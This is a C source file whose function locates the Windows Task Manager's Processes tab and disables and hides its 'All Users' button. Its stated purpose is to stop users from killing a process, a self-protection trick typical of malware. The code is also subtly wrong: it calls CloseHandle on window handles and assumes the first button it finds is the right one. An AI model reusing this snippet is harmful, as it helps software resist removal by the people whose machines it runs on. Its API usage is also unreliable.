/*
Block task manager
Disables the All Users button in Task Manager to prevent convenient killing of the process through the object permission modifications
https://msdn.microsoft.com/en-us/library/windows/desktop/ms633499%28v=vs.85%29.aspx
https://msdn.microsoft.com/en-us/library/windows/desktop/ms633500%28v=vs.85%29.aspx
*/
#include <windows.h>

void DisableTaskManagerAllUsersButton() 
{

    HWND hwndTaskManager = FindWindowA("#32770", "Windows Task Manager");
    if(hwndTaskManager != NULL)
    {
        HWND hwndTaskProcTab = FindWindowExA(hwndTaskManager, 0, "#32770", "Processes");
        if(hwndTaskProcTab != NULL)
        {
            HWND hwndTaskManageAllUsersButton = FindWindowExA(hwndTaskProcTab, 0, "Button", NULL);
            if(hwndTaskManageAllUsersButton != NULL)
            {
                EnableWindow(hwndTaskManageAllUsersButton, FALSE);
                ShowWindow(hwndTaskManageAllUsersButton, SW_HIDE);

                CloseHandle(hwndTaskManageAllUsersButton);
            }

            CloseHandle(hwndTaskProcTab);
        }

        CloseHandle(hwndTaskManager);
    }
}
